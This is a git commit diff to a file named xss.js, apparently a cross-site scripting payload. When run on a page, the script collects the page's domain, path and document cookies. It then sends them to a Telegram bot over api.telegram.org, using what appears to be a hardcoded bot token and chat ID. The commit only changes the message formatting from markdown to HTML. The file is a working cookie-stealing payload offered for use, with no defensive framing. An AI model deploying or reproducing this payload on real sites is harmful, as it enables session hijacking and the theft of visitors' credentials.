822fe64df7efe85f853ce7e1e85d2409b53068ed
Syukirman Amir <128995740+syukirman-amir@users.noreply.github.com>
2024-04-27 13:25:00 +0900

    Update xss.js

--- xss.js
+++ xss.js
@@ -2,9 +2,9 @@ var tokenBot = '6299530694:AAGQ4i4FThkwbr51cZZnL-Pt69uYa8EiW98'; // Your "tokenB
 var chatId = '480631913'; // Your "chatId" Here
 
 function telegramSend(tokenBot, chatId) {
-	var textData = 'XSS+Alert+in+' + document['domain']+'%0d%0a------------------------------------------------%0d%0a%0d%0a-+URL+Target+-%0d%0a' + document['location']['hostname'] + document['location']['pathname'] + '%0d%0a%0d%0a-+Document+Cookie+-%0d%0a' + document['cookie'] + '+';
+	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
     var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=markdown', true);
+    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
     xhr.send();
 }
 telegramSend(tokenBot, chatId)
